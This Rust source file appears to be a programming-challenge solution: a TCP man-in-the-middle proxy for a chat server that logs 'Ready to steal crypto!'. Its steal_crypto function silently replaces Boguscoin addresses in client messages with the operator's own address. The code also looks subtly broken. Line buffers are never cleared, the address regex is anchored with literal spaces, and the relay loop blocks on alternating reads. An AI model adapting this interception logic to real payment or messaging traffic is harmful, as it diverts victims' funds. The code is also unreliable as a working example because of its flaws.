use regex::Regex;

use env_logger::Env;
use log::{error, info};

use tokio::{
    io::{self, AsyncBufReadExt, AsyncWriteExt},
    net::{TcpListener, TcpStream},
};

use anyhow::Result;

#[tokio::main]
async fn main() -> Result<()> {
    // Setup the logging framework
    let env = Env::default()
        .filter_or("LOG_LEVEL", "info")
        .write_style_or("LOG_STYLE", "always");

    env_logger::init_from_env(env);

    info!("Starting the proxy server.");
    // Bind the listener to the address
    let listener = TcpListener::bind("0.0.0.0:8080").await?;
    info!("Ready to steal crypto!");

    loop {
        // Asynchronously wait for an inbound TcpStream.
        let (client_facing_stream, addr) = listener.accept().await?;

        // Spawn our handler to be run asynchronously.
        tokio::spawn(async move {
            info!("accepted connection from {}", addr);
            if let Err(e) = process(client_facing_stream).await {
                error!("an error occurred; error = {:?}", e);
            }
        });
    }
}

async fn process(to_client_stream: TcpStream) -> Result<()> {
    info!("Establishing a connection to the upstream server.");
    let to_server_stream = TcpStream::connect("chat.protohackers.com:16963").await?;
    info!("Connection established.");

    // what we get from the real chat server
    let mut line_from_server = String::new();

    let (server_reader, mut server_writer) = tokio::io::split(to_server_stream);
    let mut server_reader = io::BufReader::new(server_reader);

    let (client_reader, mut client_writer) = tokio::io::split(to_client_stream);
    let mut client_reader = io::BufReader::new(client_reader);

    // what we get from the client
    let mut line_from_client = String::new();

    loop {
        // whatever we get from the server...
        let _: usize = server_reader.read_line(&mut line_from_server).await?;
        info!("From server: {}", line_from_server);

        //... we send back to client
        client_writer.write_all(line_from_server.as_bytes()).await?;

        // but what we get from the client...
        let bytes_from_client = client_reader.read_line(&mut line_from_client).await?;
        info!("From client: {}", line_from_client);

        // ...we check if we can alter the crypto address
        let altered_line = steal_crypto(&line_from_client);
        info!("To server: {}", altered_line);

        // and then we pass the altered line
        server_writer.write_all(altered_line.as_bytes()).await?;

        // Nothing more to read, let's bail
        if bytes_from_client == 0 {
            break;
        }
    }
    Ok(())
}

fn replace_substring(s: &str, old: &str, new: &str) -> String {
    s.replace(old, new)
}

fn get_substring(s: &str) -> Option<&str> {
    let re = Regex::new(r"^ 7[a-zA-Z0-9]{25,34} $").unwrap();
    re.find(s).map(|m| m.as_str())
}

fn steal_crypto(line: &str) -> String {
    if let Some(boguscoin_address) = get_substring(line) {
        replace_substring(line, boguscoin_address, "7YWHMfk9JZe0LM0g1ZauHuiSxhI")
    } else {
        String::from(line)
    }
}
